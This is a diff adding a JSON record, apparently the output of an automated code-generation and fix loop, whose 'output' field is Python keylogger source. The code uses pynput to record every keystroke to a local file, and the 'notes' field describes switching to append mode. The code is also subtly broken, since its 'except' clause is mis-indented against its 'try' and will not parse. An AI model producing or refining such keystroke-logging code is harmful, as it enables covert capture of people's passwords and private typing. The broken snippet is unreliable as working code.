@@ -1,0 +1,9 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as keylog_file:\n            if isinstance(key, keyboard.KeyCode):\n                key = str(key).strip(\"'\")\n                if len(key) == 1:\n                    keylog_file.write(key)\n                else:\n                    keylog_file.write('[' + key + ']')\n            elif key == keyboard.Key.space:\n                keylog_file.write(' [SPACE]')\n            elif key == keyboard.Key.enter:\n                keylog_file.write('\\n[ENTER]\\n')\nexcept Exception as e:\n    print(f'An error occurred: {e}')\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "Added 'a' mode for appending to file.",
+  "applied_fixes": [
+    "major",
+    "iteration8_issue1"
+  ],
+  "iterations": 9
+}
